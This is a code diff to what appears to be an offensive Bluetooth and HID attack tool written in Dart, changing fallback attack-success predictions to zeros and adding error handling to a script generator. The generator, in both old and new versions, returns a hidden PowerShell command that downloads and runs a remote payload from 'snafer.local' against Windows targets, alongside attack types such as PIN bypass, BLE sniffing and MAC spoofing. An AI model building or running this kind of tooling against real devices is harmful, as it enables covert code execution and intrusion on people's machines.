@@ -192,8 +192,8 @@ class IntegratedAIService {
       AdvancedLogger.staticLogger
           .logError('Error en predicción real de éxito de ataque: $e');
       return AttackSuccessPrediction(
-        attackSuccessProbabilities: [0.3, 0.2, 0.4, 0.1, 0.2, 0.3, 0.1, 0.2],
-         attackTypes: [
+        attackSuccessProbabilities: List.filled(8, 0.0),
+        attackTypes: [
           'obex_put',
           'ftp_anonymous',
           'pin_bypass',
@@ -203,7 +203,8 @@ class IntegratedAIService {
           'ble_sniff',
           'mac_spoofing'
         ],
-        overallSuccessScore: 0.23,
+        overallSuccessScore: 0.0,
+        modelConfidence: 0.0,
       );
     }
   }
@@ -242,7 +243,7 @@ class IntegratedAIService {
           .logError('Error en clasificación real de dispositivo: $e');
       return DeviceClassification(
         deviceCategory: 'unknown',
-        categoryProbabilities: [0.1, 0.1, 0.1, 0.1, 0.1, 0.1],
+        categoryProbabilities: List.filled(6, 0.0),
         categories: [
           'smartphone',
           'tablet',
@@ -297,16 +298,8 @@ class IntegratedAIService {
           .logError('Error en detección real de contramedidas: $e');
       return CountermeasureDetection(
         detectedCountermeasures: <String>[],
-        countermeasureProbabilities: <double>[
-          0.1,
-          0.1,
-          0.1,
-          0.1,
-          0.1,
-          0.1,
-          0.1
-        ],
-        overallSecurityLevel: 0.1,
+        countermeasureProbabilities: List.filled(7, 0.0),
+        overallSecurityLevel: 0.0,
         countermeasures: <String>[
           'pin_required',
           'authentication',
@@ -1165,27 +1158,34 @@ public class $selectedExploit {
   }
 
   /// Genera un script HID optimizado por IA según el dispositivo objetivo
-  Future<String> generateAIScript(Map<String, dynamic> deviceData) async {
-    _updateProgress(0.2, 'Analizando arquitectura del objetivo...');
-    
-    // Inferencia con el generador de exploits
-    final aiOutput = await _tfliteService.runInference(
-      'java_exploit_generator',
-      _prepareInputData(deviceData, 'exploit_generation'),
-    );
+   Future<String?> generateAIScript(Map<String, dynamic> deviceData) async {
+     _updateProgress(0.2, 'Analizando arquitectura del objetivo...');
+     
+     // Inferencia con el generador de exploits
+     try {
+       final aiOutput = await _tfliteService.runInference(
+         'java_exploit_generator',
+         _prepareInputData(deviceData, 'exploit_generation'),
+       );
 
-    // Identificación de OS
-    final classification = await identifyAndOptimize(deviceData);
-    final String os = classification['identifiedType'].toString().toUpperCase();
+       // Identificación de OS
+       final classification = await identifyAndOptimize(deviceData);
+       final String os = classification['identifiedType'].toString().toUpperCase();
 
-    if (os.contains('WINDOWS')) {
-      if (aiOutput[0] > 0.5) return 'powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://snafer.local/payload.ps1\')"';
-      return 'cmd /c "echo hacked > %TEMP%\\log.txt"';
-    } else if (os.contains('MOBILE') || os.contains('ANDROID')) {
-      return 'input keyevent 26'; 
-    }
-    return 'echo "AI Script Generated"';
-  }
+       if (os.contains('WINDOWS')) {
+         if (aiOutput[0] > 0.5) {
+           return 'powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://snafer.local/payload.ps1\')"';
+         }
+         return 'cmd /c "echo hacked > %TEMP%\\log.txt"';
+       } else if (os.contains('MOBILE') || os.contains('ANDROID')) {
+         return 'input keyevent 26'; 
+       }
+       return 'echo "AI Script Generated"';
+     } catch (e) {
+       AdvancedLogger.staticLogger.logWarning('No se pudo generar script AI', {'error': e.toString()});
+       return null;
+     }
+   }
 }
 
 /// Estrategia de ataque óptima basada en modelos TFLite reales
